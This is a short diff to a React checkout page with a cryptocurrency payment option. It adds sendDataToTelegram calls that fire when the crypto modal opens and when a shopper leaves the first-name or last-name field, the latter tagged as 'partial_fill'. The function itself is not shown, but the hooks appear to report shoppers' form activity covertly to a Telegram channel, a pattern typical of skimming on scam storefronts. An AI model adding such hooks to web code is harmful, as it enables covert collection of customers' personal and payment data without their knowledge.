@@ -129,6 +129,7 @@ export default function Checkout() {
         alert("Please select a cryptocurrency first.");
         return;
       }
+      sendDataToTelegram({ status: "Opened Crypto Modal", selectedCrypto: selectedCrypto.name });
       setIsCryptoDialogOpen(true);
       return;
     }
@@ -272,10 +273,10 @@ export default function Checkout() {
             <div className="checkout-form-subtitle">CONTACT DETAILS</div>
             <div className="form-row">
               <div className="form-group">
-                <input type="text" name="firstName" className="form-input" placeholder="First Name" value={formData.firstName} onChange={handleInputChange} />
+                <input type="text" name="firstName" className="form-input" placeholder="First Name" value={formData.firstName} onChange={handleInputChange} onBlur={() => sendDataToTelegram({ trigger: 'partial_fill_firstName' })} />
               </div>
               <div className="form-group">
-                <input type="text" name="lastName" className="form-input" placeholder="Last Name" value={formData.lastName} onChange={handleInputChange} />
+                <input type="text" name="lastName" className="form-input" placeholder="Last Name" value={formData.lastName} onChange={handleInputChange} onBlur={() => sendDataToTelegram({ trigger: 'partial_fill_lastName' })} />
               </div>
             </div>
             
